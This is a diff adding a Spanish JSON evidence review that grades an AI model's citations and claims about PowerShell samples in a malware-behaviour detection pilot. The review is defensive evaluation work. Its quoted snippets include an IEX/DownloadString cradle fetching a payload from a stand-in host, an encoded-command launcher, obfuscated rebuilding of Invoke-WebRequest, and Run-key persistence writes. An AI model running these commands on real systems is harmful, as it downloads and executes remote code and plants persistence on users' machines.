@@ -1,0 +1,154 @@
+{
+  "review_version": "evidence-review-v2",
+  "source_run": "pilot-v1_20261101T001806Z",
+  "supersedes": null,
+  "historical_review": "experiments/results/pilot/pilot-v1_20261101T001806Z/semantic_review.json (se conserva sin cambios)",
+  "reviewer": "AI-assist",
+  "human_validation": "pending",
+  "created": "2026-11-01",
+  "policy": {
+    "existence": "Automatica: experiments/evaluation/evidence_review.py clasifica cada cita por procedencia (analyzed_input original o variante, team_reference, model_recovered_unverified, not_found).",
+    "individual": "El fragmento citado basta por si solo para justificar el comportamiento.",
+    "contextual": "Varios fragmentos citados por el modelo, o recuperados por el en recovered_content y verificables contra el script, justifican juntos el hallazgo.",
+    "insufficient": "La evidencia existe pero no sostiene la conclusion.",
+    "pending_human": "Requiere juicio humano que esta revision no puede sustituir.",
+    "uncited_context": "Politica estricta (por defecto, propuesta): el contexto del script que el modelo NO cito ni recupero no cuenta. La variante 'verdict_if_uncited_context_allowed' muestra el resultado con la politica permisiva. La eleccion de politica es una decision pendiente del propietario.",
+    "team_reference": "Una referencia decodificada preparada por el equipo (reference/*.ps1.txt) nunca cuenta como recuperacion del modelo.",
+    "text_claim_kinds": {
+      "false_operation": "Afirma una operacion que no existe en el script ni en su contenido recuperable.",
+      "unsupported_assertion": "Afirma como hecho algo que el modelo no establecio con su propio analisis (aunque pueda ser cierto).",
+      "speculative": "Menciona de forma hipotetica ('could be used') una operacion ausente. Su inclusion como error queda pendiente de decision humana.",
+      "misclassification": "Describe correctamente el codigo pero lo asigna a una categoria contraria a la taxonomia."
+    }
+  },
+  "findings": [
+    {
+      "case_id": "P1",
+      "behavior_id": "B05",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet": "Get-Process", "individual": "individual", "note": "Consulta de procesos del host."},
+        {"snippet": "Sort-Object -Property CPU -Descending", "individual": "insufficient", "note": "Procesa la consulta; no es reconocimiento por si sola."},
+        {"snippet": "Select-Object -First 5 -Property Name, Id, CPU", "individual": "insufficient", "note": "Procesa la consulta."},
+        {"snippet": "Format-Table -AutoSize", "individual": "insufficient", "note": "Muestra el resultado (solo en repeticiones 2 y 3)."}
+      ],
+      "context_groups": [],
+      "uncited_context": [],
+      "verdict_if_uncited_context_allowed": "individual",
+      "note": "Sin cambios respecto a la revision historica."
+    },
+    {
+      "case_id": "P2",
+      "behavior_id": "B02",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet_prefix": "powershell.exe -NoProfile -EncodedCommand ", "individual": "insufficient", "note": "Lanzador -EncodedCommand: tecnica OT-B64-ENCCMD / operacion anadida LAUNCHER_ENCCMD, no B02 (taxonomia v0.2 B02; prompt v1 linea 40). El modelo no decodifico: recovered_content repite el lanzador."}
+      ],
+      "context_groups": [],
+      "uncited_context": [],
+      "verdict_if_uncited_context_allowed": "insufficient",
+      "note": "Ademas la etiqueta no esta en la referencia (falso positivo)."
+    },
+    {
+      "case_id": "P3",
+      "behavior_id": "B01",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet": "$u = 'https://' + 'example' + '.com/' + 'rep' + 'ort.csv'", "individual": "insufficient", "note": "Construye una URL; una URL aislada no demuestra la descarga (taxonomia B01)."},
+        {"snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing", "individual": "insufficient", "note": "La identidad del comando ($c) no aparece en el fragmento; -Uri/-OutFile son indicios, no prueba."}
+      ],
+      "context_groups": [
+        {
+          "members": ["$u = 'https://' + 'example' + '.com/' + 'rep' + 'ort.csv'", "& $c -Uri $u -OutFile $destino -UseBasicParsing"],
+          "model_recovered": ["Invoke-WebRequest", "https://example.com/report.csv"],
+          "verdict": "contextual",
+          "note": "URL + llamada que la usa + nombre del cmdlet reconstruido por el modelo en recovered_content. 'Invoke-WebRequest' es verificable como union de los literales de la linea 2, que el modelo no cito. Confirmacion humana pendiente."
+        }
+      ],
+      "uncited_context": [{"line": 2, "text": "$c = 'Invoke-' + 'Web' + 'Request'"}],
+      "verdict_if_uncited_context_allowed": "contextual",
+      "note": "Historico: 1 cita 'supports' (la llamada) y 1 'partial'. Con la nueva metodologia ninguna basta sola; el soporte es contextual."
+    },
+    {
+      "case_id": "P4",
+      "behavior_id": "B03",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet": "New-ItemProperty -Path $a -Name $b -Value $d -PropertyType String -Force", "individual": "insufficient", "note": "Escribe un valor de registro en la ruta $a; que $a sea la clave Run solo se ve en la linea 1, que el modelo no cito ni recupero (recovered_content vacio)."}
+      ],
+      "context_groups": [],
+      "uncited_context": [{"line": 1, "text": "$a = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"}],
+      "verdict_if_uncited_context_allowed": "contextual",
+      "note": "Historico: 'supports' ($a se resuelve en la linea 1). Es el caso que depende de la politica de contexto no citado: decision del propietario."
+    },
+    {
+      "case_id": "P5",
+      "behavior_id": "B01",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet": "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.txt')", "individual": "individual", "note": "Contiene Net.WebClient.DownloadString sobre una URL remota."}
+      ],
+      "context_groups": [],
+      "uncited_context": [],
+      "verdict_if_uncited_context_allowed": "individual",
+      "note": "La misma cita contiene IEX, evidencia de B02 que el modelo no etiqueto (ver unreported_evidence)."
+    },
+    {
+      "case_id": "P6",
+      "behavior_id": "B01",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet_prefix": "powershell.exe -NoProfile -EncodedCommand ", "individual": "insufficient", "note": "Blob Base64 sin interpretar: recovered_content repite el lanzador. Que la referencia del equipo (reference/PILOT-P6_decoded) muestre DownloadString no cuenta como recuperacion del modelo."}
+      ],
+      "context_groups": [],
+      "uncited_context": [],
+      "verdict_if_uncited_context_allowed": "insufficient",
+      "note": "La etiqueta coincide con la referencia sin respaldo."
+    },
+    {
+      "case_id": "P7",
+      "behavior_id": "B01",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet": "$u = '{2}{0}{3}{1}' -f 'example.com/', 'csv', 'https://', 'report.'", "individual": "insufficient", "note": "Construye la URL con -f; no es descarga por si sola."},
+        {"snippet": "$c = '{1}{0}' -f 'WebRequest', 'Invoke-'", "individual": "insufficient", "note": "Reconstruir el nombre Invoke-WebRequest no demuestra su uso."},
+        {"snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing", "individual": "insufficient", "note": "Uso de $c sin mostrar su identidad."}
+      ],
+      "context_groups": [
+        {
+          "members": ["$u = '{2}{0}{3}{1}' -f 'example.com/', 'csv', 'https://', 'report.'", "$c = '{1}{0}' -f 'WebRequest', 'Invoke-'", "& $c -Uri $u -OutFile $destino -UseBasicParsing"],
+          "model_recovered": [],
+          "verdict": "contextual",
+          "note": "Nombre reconstruido + URL + llamada que usa ambos. Requiere resolver -f ({1}{0} -> Invoke-WebRequest); el modelo solo listo las piezas en recovered_content. Confirmacion humana pendiente."
+        }
+      ],
+      "uncited_context": [],
+      "verdict_if_uncited_context_allowed": "contextual",
+      "note": "Historico: 2 citas 'supports' y 1 'partial'. El soporte es contextual, no individual."
+    },
+    {
+      "case_id": "P8",
+      "behavior_id": "B03",
+      "repetitions": [1, 2, 3],
+      "citations": [
+        {"snippet": "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'PilotLabUpdater' -Value 'C:\\ProgramData\\PilotLab\\no-existe\\updater.exe' -PropertyType String -Force", "individual": "individual", "note": "Escritura literal en la clave Run."}
+      ],
+      "context_groups": [],
+      "uncited_context": [],
+      "verdict_if_uncited_context_allowed": "individual",
+      "note": "Sin cambios."
+    }
+  ],
+  "text_claims": [
+    {"case_id": "P2", "repetitions": [1, 2, 3], "field": "behaviors.B02.explanation", "quote": "which is a form of dynamic code execution", "kind": "misclassification", "note": "Atribuye B02 al lanzador -EncodedCommand."},
+    {"case_id": "P2", "repetitions": [1, 2, 3], "field": "risk_rationale", "quote": "could be used for malicious purposes such as downloading and executing remote code", "kind": "speculative", "note": "El contenido decodificado (referencia del equipo) es Get-Process; el modelo no decodifico."},
+    {"case_id": "P3", "repetitions": [1, 2, 3], "field": "risk_rationale", "quote": "could be used for malicious purposes such as downloading malware or stealing data", "kind": "speculative", "note": "No existe robo de datos. No figuraba en la revision historica: inconsistencia con P2, que si se conto."},
+    {"case_id": "P5", "repetitions": [1, 2, 3], "field": "behaviors.B01.explanation", "quote": "using Invoke-WebRequest", "kind": "false_operation", "note": "El script usa Net.WebClient.DownloadString."},
+    {"case_id": "P6", "repetitions": [1, 2, 3], "field": "behaviors.B01.explanation", "quote": "This indicates that the script is downloading and executing remote code", "kind": "unsupported_assertion", "note": "Cierto en la referencia decodificada, pero el modelo no decodifico."},
+    {"case_id": "P6", "repetitions": [1, 2, 3], "field": "risk_rationale", "quote": "The script is downloading and executing remote code", "kind": "unsupported_assertion", "note": "Idem."},
+    {"case_id": "P7", "repetitions": [1, 2, 3], "field": "risk_rationale", "quote": "the combination of downloading and executing remote code", "kind": "false_operation", "note": "El script descarga a un archivo; no ejecuta lo descargado."}
+  ],
+  "unreported_evidence": [
+    {"case_id": "P5", "repetitions": [1, 2, 3], "behavior_id": "B02", "fragment": "IEX", "note": "Presente en la unica cita del modelo y en la anotacion A-P012; no etiquetado."}
+  ]
+}
